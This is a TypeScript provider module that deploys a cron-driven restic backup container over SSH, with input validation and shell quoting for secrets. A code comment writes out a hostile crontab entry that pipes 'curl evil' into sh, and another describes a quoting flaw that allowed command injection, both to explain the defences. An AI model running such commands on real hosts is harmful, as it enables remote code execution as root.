import type { Provider, ResolvedInputs } from "@intentic/engine";
import { dockerEnvLine, shellQuote } from "@intentic/sandbox-run/quote";
import { z } from "zod";
import { parseInputs, sshSchema, sshTarget } from "../core/inputs.js";
import { listStampedContainers } from "../core/list-stamped.js";
import type { SshExecutor, SshSession } from "../core/ssh.js";
import { sshExecutor } from "../core/ssh.js";

// Secrets arrive already resolved to strings (the engine substitutes $secret before calling the provider).
// retention/schedule carry the resolver-or-default cron + keep counts. signoz opts the observability volumes
// into the backup set.
const backupSchema = sshSchema.extend({
    repo: z.string(),
    password: z.string(),
    image: z.string(),
    signoz: z.coerce.boolean().default(false),
    credentials: z.record(z.string(), z.string()).default({}),
    // A crontab has no quoting whatsoever, so this field is guarded by SHAPE rather than escaped. Two ways it
    // would otherwise become "run anything, as root, on a schedule": a newline appends a whole cron entry, and
    // a SIXTH field is already the command — `0 3 * * * curl evil|sh #` leaves the intended script commented
    // out behind a `#`. Exactly five fields of cron's own alphabet admits neither, and rejects at parse time
    // with the operator's typo named rather than at 3am on the host.
    schedule: z
        .string()
        .regex(/^[\d*,/A-Za-z-]+(?: [\d*,/A-Za-z-]+){4}$/, "must be exactly five cron fields (minute hour day month weekday)")
        .default("0 3 * * *"),
    retention: z
        .object({ daily: z.coerce.number().default(7), weekly: z.coerce.number().default(4), monthly: z.coerce.number().default(6) })
        .default({ daily: 7, weekly: 4, monthly: 6 }),
});
type BackupInputs = z.infer<typeof backupSchema>;
const parse = (inputs: ResolvedInputs): BackupInputs => parseInputs(backupSchema, inputs, "backup");

const CONTAINER = "intentic-backup";
const STATE_DIR = "/opt/intentic/backup";
const ENV_FILE = `${STATE_DIR}/restic.env`;
const SCRIPT_FILE = `${STATE_DIR}/backup.sh`;
const CRONTAB_FILE = `${STATE_DIR}/crontab`;
// Inspecting labels (set at create time) is the observable truth for the schedule + repo; "|" is a safe
// separator (cron has spaces, the repo may have ":" — neither contains "|").
const SEP = "|";

// The default on-host restic repo lives in this named volume, mounted into the backup + restore containers
// at the repo path. A repo path starting with "/" is a restic LOCAL repo (the on-host default); one with a
// scheme (s3:/b2:/rest:/sftp:) is remote and needs no volume. A host migration streams this volume old->new.
export const REPO_VOLUME = "intentic-restic-repo";
export const isLocalRepo = (repo: string): boolean => repo.startsWith("/");

// The volumes backed up, host volume name -> in-container mount path. Komodo's compose prefixes its volumes
// with the project name; Forgejo's is the single named data volume. SignOz's (large, reconstructable) are
// added only when opted in.
const volumeMounts = (signoz: boolean): Record<string, string> => ({
    "intentic-forgejo-data": "/volumes/forgejo",
    "komodo_postgres-data": "/volumes/komodo-postgres",
    komodo_keys: "/volumes/komodo-keys",
    "komodo_ferretdb-state": "/volumes/komodo-ferretdb",
    ...(signoz ? { "signoz_clickhouse-data": "/volumes/signoz-clickhouse", "signoz_signoz-data": "/volumes/signoz-signoz" } : {}),
});

// The backup script crond runs each tick, INSIDE the restic container (busybox sh). App-consistent dumps
// first (best-effort — the read-only volume backup that follows is the fallback), then one restic snapshot of
// the staging dumps + the mounted volumes + the host's /opt/intentic state dir, then a retention prune. The
// repo + keep counts are baked in (so a config change rewrites this file and the diff reconciles); the
// password + backend creds come from the --env-file restic.env. Written under a quoted heredoc so the host
// shell does not expand the script's own $vars.
const backupScript = (parsed: BackupInputs): string =>
    [
        "#!/bin/sh",
        "set -eu",
        "STAGING=/staging",
        'rm -rf "$STAGING"; mkdir -p "$STAGING"',
        "# Forgejo: app-consistent dump (as the git user) copied out over the docker socket.",
        "if docker exec -u git intentic-forgejo forgejo dump --type tar --file /tmp/intentic-forgejo.tar >/dev/null 2>&1; then",
        '  docker cp intentic-forgejo:/tmp/intentic-forgejo.tar "$STAGING/forgejo-dump.tar"',
        "  docker exec intentic-forgejo rm -f /tmp/intentic-forgejo.tar",
        'else echo "forgejo dump skipped"; fi',
        "# Komodo: logical pg_dump of the FerretDB-backing postgres (matched by its compose labels).",
        "PG=$(docker ps -q -f label=com.docker.compose.project=komodo -f label=com.docker.compose.service=postgres)",
        'if [ -n "$PG" ]; then docker exec "$PG" pg_dump -U komodo -d postgres > "$STAGING/komodo.sql"; else echo "komodo pg_dump skipped"; fi',
        // The on-host default repo is intentic-owned, so self-init it on first use (idempotent: skip when the
        // repo config already reads). A remote repo is the operator's — left as-is (they pre-create it).
        ...(isLocalRepo(parsed.repo)
            ? [`restic -r ${shellQuote(parsed.repo)} cat config >/dev/null 2>&1 || restic -r ${shellQuote(parsed.repo)} init`]
            : []),
        `restic -r ${shellQuote(parsed.repo)} backup "$STAGING" /volumes /host-opt-intentic`,
        `restic -r ${shellQuote(parsed.repo)} forget --keep-daily ${parsed.retention.daily} --keep-weekly ${parsed.retention.weekly} --keep-monthly ${parsed.retention.monthly} --prune`,
        "",
    ].join("\n");

const running = async (session: SshSession): Promise<boolean> => {
    const result = await session.exec(`docker ps --filter "name=^${CONTAINER}$" --format '{{.Names}}'`);
    return result.stdout.trim() === CONTAINER;
};

// The create-time image + the schedule/repo labels — the observable config the diff converges on.
const observe = async (session: SshSession): Promise<{ image: string; schedule: string; repo: string }> => {
    const result = await session.exec(
        `docker inspect --format '{{.Config.Image}}${SEP}{{index .Config.Labels "intentic.schedule"}}${SEP}{{index .Config.Labels "intentic.repo"}}' ${CONTAINER} 2>/dev/null || true`,
    );
    const [image = "", schedule = "", repo = ""] = result.stdout.trim().split(SEP);
    return { image, schedule, repo };
};

// Write restic.env ONCE (chmod 600 — the encryption password + backend creds must survive recreation, like
// komodo's .env), always rewrite the script + crontab (so a schedule/repo/retention change reconciles).
const ensureFiles = async (session: SshSession, parsed: BackupInputs): Promise<void> => {
    await session.exec(`mkdir -p ${STATE_DIR}`);
    // Two layers, one call each. dockerEnvLine renders the file's line (raw — `docker run --env-file` keeps
    // quotes as part of the value), shellQuote carries that line through the host shell as one printf argument.
    // The old form wrapped each line in bare `'…'`, so an apostrophe in a restic password or an S3 secret key
    // ended the quoting and ran the rest as a command on the host, as root, at deploy time.
    const envLines = [
        dockerEnvLine("RESTIC_PASSWORD", parsed.password),
        ...Object.entries(parsed.credentials).map(([key, value]) => dockerEnvLine(key, value)),
    ]
        .map((line) => shellQuote(line))
        .join(" ");
    await session.exec(`test -f ${ENV_FILE} || { printf '%s' ${envLines} > ${ENV_FILE} && chmod 600 ${ENV_FILE}; }`);
    await session.exec(`cat > ${SCRIPT_FILE} <<'BACKUP_EOF'\n${backupScript(parsed)}BACKUP_EOF`);
    await session.exec(`chmod +x ${SCRIPT_FILE}`);
    await session.exec(`cat > ${CRONTAB_FILE} <<'CRON_EOF'\n${parsed.schedule} /bin/sh ${SCRIPT_FILE}\nCRON_EOF`);
};

// The read-only volume mounts + the host script/crontab/socket/docker-cli mounts the container runs with.
const mountArgs = (parsed: BackupInputs, dockerBin: string): string => {
    const volumes = Object.entries(volumeMounts(parsed.signoz))
        .map(([name, path]) => `-v ${name}:${path}:ro`)
        .join(" ");
    return [
        "-v /var/run/docker.sock:/var/run/docker.sock",
        `-v ${dockerBin}:/usr/local/bin/docker:ro`,
        volumes,
        // The on-host default repo's volume, mounted read-write at the repo path so restic can write to it.
        ...(isLocalRepo(parsed.repo) ? [`-v ${shellQuote(`${REPO_VOLUME}:${parsed.repo}`)}`] : []),
        "-v /opt/intentic:/host-opt-intentic:ro",
        `-v ${SCRIPT_FILE}:/backup.sh:ro`,
        `-v ${CRONTAB_FILE}:/etc/crontabs/root:ro`,
        `--env-file ${ENV_FILE}`,
    ].join(" ");
};

// The scheduled restic backup for a host: a container running busybox crond that, on the declared cron, dumps
// Forgejo + Komodo (and SignOz volumes when opted in) to the operator's restic repo. read returns the
// resource only when the container is up, surfacing the running image + schedule/repo labels; diff recreates
// on any drift (real reconciled config); apply discovers the host docker CLI (the restic image has none),
// writes the once-guarded secret env + the regenerated script/crontab, and (re)runs the container. delete
// removes the container + host state but NEVER touches the restic repo — those snapshots are the user's data.
export const createBackupProvider = (executor: SshExecutor = sshExecutor): Provider => ({
    read: async (inputs, ctx) => {
        const parsed = parse(inputs);
        let session: SshSession;
        try {
            session = await executor.connect(sshTarget(parsed));
        } catch (error) {
            ctx.log(`backup "${ctx.id}": host not reachable over SSH, treating as not-yet-created: ${String(error)}`);
            return undefined;
        }
        try {
            // observe is a single `|| true`'d inspect, safe on a stopped/absent container — issue it alongside
            // the running() gate and discard it when the container isn't up, saving a round-trip when it is.
            const [up, observed] = await Promise.all([running(session), observe(session)]);
            if (!up) {
                return undefined;
            }
            return { outputs: {}, detail: observed };
        } finally {
            await session.dispose();
        }
    },
    diff: (inputs, observed) => {
        const parsed = parse(inputs);
        const detail = observed.detail;
        if (detail?.["image"] !== parsed.image) {
            return { action: "update", reason: `backup image differs (running ${String(detail?.["image"])}, want ${parsed.image})` };
        }
        if (detail["schedule"] !== parsed.schedule) {
            return { action: "update", reason: `backup schedule differs (running ${String(detail["schedule"])}, want ${parsed.schedule})` };
        }
        if (detail["repo"] !== parsed.repo) {
            return { action: "update", reason: `backup repo differs (running ${String(detail["repo"])}, want ${parsed.repo})` };
        }
        return { action: "noop" };
    },
    apply: async (inputs, _observed, ctx) => {
        const parsed = parse(inputs);
        const session = await executor.connect(sshTarget(parsed));
        try {
            // The restic image carries no docker CLI; bind-mount the host's static binary (the forgejo-runner
            // pattern) so the dump steps can `docker exec` into the forgejo/komodo containers.
            const dockerBin = (await session.exec("command -v docker")).stdout.trim();
            if (dockerBin === "") {
                throw new Error("backup: no docker CLI found on the host (the backup container needs it for app-consistent dumps)");
            }
            await ensureFiles(session, parsed);
            await session.exec(`docker rm -f ${CONTAINER} 2>/dev/null || true`);
            const run = await session.exec(
                `docker run -d --restart unless-stopped --name ${CONTAINER} --label ${shellQuote(`intentic.id=${ctx.id}`)} --label intentic.type=backup ` +
                    `--label ${shellQuote(`intentic.schedule=${parsed.schedule}`)} --label ${shellQuote(`intentic.repo=${parsed.repo}`)} ` +
                    `${mountArgs(parsed, dockerBin)} --entrypoint crond ${shellQuote(parsed.image)} -f -l 8`,
            );
            if (run.code !== 0) {
                throw new Error(`failed to start backup container on host: exited ${run.code}: ${run.stderr.trim()}`);
            }
            return {};
        } finally {
            await session.dispose();
        }
    },
    // Parses only the SSH block, so it works from a removed node's inputs AND a ListedResource's (a host's).
    delete: async (inputs, ctx) => {
        const session = await executor.connect(sshTarget(parseInputs(sshSchema, inputs, "backup")));
        try {
            // Remove the scheduler + host-side script/secret state. The restic repo and its snapshots are the
            // user's data living off-host — intentic never deletes them.
            await session.exec(`docker rm -f ${CONTAINER} 2>/dev/null || true`);
            await session.exec(`rm -rf ${STATE_DIR}`);
            ctx.log(`backup "${ctx.id}" removed; the restic repo and its snapshots are left untouched`);
        } finally {
            await session.dispose();
        }
    },
    list: (sources, ctx) => listStampedContainers(executor, "backup", sources, ctx.log),
});
